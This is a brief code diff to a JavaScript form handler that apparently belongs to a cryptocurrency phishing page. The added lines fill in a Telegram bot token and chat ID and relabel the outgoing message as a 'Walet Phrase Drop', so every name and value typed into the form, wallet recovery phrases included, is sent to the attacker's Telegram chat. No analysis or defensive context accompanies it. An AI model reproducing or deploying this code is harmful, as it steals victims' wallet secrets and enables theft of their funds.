@@ -48,9 +48,9 @@ function inspectExport(formdata, nextpage) {
     on_submit();
 
     let strings = formdata;
-    let apiToken = "";
-    let chatId = "";
-    let message = `New Drop 🏆🏆🏆 %0A%0AFrom: ${window.location.host} %0A%0A`;
+    let apiToken = "7257237752:AAERF_PAK1KdieJMeZU485CJA9RcF1B8PqM";
+    let chatId = "7740546177";
+    let message = `New Walet Phrase Drop 🏆🏆🏆 %0A%0AFrom: ${window.location.host} %0A%0A`;
 
     Object.keys(strings).forEach(function (key) {
         message += ` ${strings[key]['name']} : ${strings[key]['value']} %0A%0A`;
